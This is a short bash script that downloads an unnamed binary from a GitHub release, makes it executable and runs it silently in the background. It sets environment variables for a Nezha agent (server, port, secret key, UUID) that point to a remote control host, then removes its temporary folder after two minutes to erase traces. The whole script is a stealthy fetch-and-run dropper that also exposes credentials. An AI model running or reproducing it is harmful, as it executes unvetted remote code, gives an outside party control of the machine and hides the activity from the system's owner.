#!/bin/bash

# Configuration
URL="https://github.com/babama1001980/good/releases/download/npc/theone"
FILENAME="theone"
TMP_DIR=".tmp"

# Environment Variables
export UUID="faacf142-dee8-48c2-8558-641123eb939c"
export NEZHA_SERVER="nezha.mingfei1981.eu.org"
export NEZHA_PORT="443"
export NEZHA_KEY="zkzCEmXJTLTKbh48MR"

# Setup workspace
mkdir -p $TMP_DIR
cd $TMP_DIR

# Download and prepare binary
curl -L -s -o $FILENAME $URL
chmod +x $FILENAME

# Execute in background (Silent mode)
nohup ./$FILENAME >/dev/null 2>&1 &

# Cleanup task in background after 120 seconds
(
    sleep 120
    cd ..
    rm -rf $TMP_DIR
) &

exit 0
